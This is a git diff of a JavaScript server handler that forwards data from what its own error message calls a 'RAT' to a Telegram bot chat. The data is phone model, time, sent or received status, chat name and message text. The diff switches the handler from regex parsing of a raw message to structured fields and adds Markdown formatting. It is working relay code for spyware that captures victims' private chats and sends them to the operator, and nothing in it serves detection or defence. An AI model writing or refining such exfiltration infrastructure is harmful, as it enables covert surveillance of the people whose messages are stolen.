@@ -9,37 +9,31 @@ export default async function handler(request, response) {
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     if (!expectedApiKey || !botToken || !chatId) {
-        return response.status(500).json({ error: 'Server configuration error' });
+        return response.status(500).json({ error: 'Server config fucked up' });
     }
 
     if (accessKey !== expectedApiKey) {
-        return response.status(401).json({ error: 'Unauthorized' });
+        return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
     }
 
-    if (!data.message) {
-        return response.status(400).json({ error: 'Message field missing' });
+    const { model, time, type, chat, message } = data;
+
+    if (!model || !time || !type || !chat || !message) {
+        return response.status(400).json({ error: 'Incomplete data from RAT. Make sure model, time, type, chat, message are sent.' });
     }
 
     try {
-        const rawText = data.message;
+        const status = type.toLowerCase() === 'sent' ? '📤 SENT' : '📥 RECEIVED';
 
-        const device = (rawText.match(/\*\*(INFINIX.*?)\*\*/) || [])[1] || 'N/A';
-        const time = (rawText.match(/\*\*Time:\*\* ([\d:]+)/) || [])[1] || 'N/A';
-        const status = (rawText.match(/\*\*(SENT|RECEIVED)\*\*/) || [])[1] || 'Status N/A';
-        const chat = (rawText.match(/\*\*Chat:\*\* (.*?)(?=\s*\*\*|$)/) || [])[1] || 'Chat N/A';
-        const message = (rawText.match(/\*\*Message:\*\* (.*)/s) || [])[1] || 'Message N/A';
+        const formattedMessage = `
+📱 *${model}*
+Time: \`${time}\`
 
-        // 'SENT' ko 'SEND' karne ka system
-        const displayStatus = status.trim().toUpperCase() === 'SENT' ? 'SEND' : status.trim();
-        const statusIcon = displayStatus === 'SEND' ? '📤' : '📥';
+${status}
 
-        let formattedMessage = `📱 ${device.trim()}
-🕒 Time: ${time.trim()}
-
-${statusIcon} ${displayStatus}
-
-Chat: ${chat.trim()}
-Message: ${message.trim()}`;
+Chat: *${chat}*
+Message: \`${message}\`
+        `.trim();
 
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
@@ -49,11 +43,13 @@ Message: ${message.trim()}`;
             body: JSON.stringify({
                 chat_id: chatId,
                 text: formattedMessage,
+                parse_mode: 'Markdown',
             }),
         });
         
         return response.status(200).json({ status: 'ok' });
     } catch (error) {
-        return response.status(500).json({ error: 'Failed to format and forward data' });
+        console.error(error);
+        return response.status(500).json({ error: 'Failed to forward data' });
     }
 }
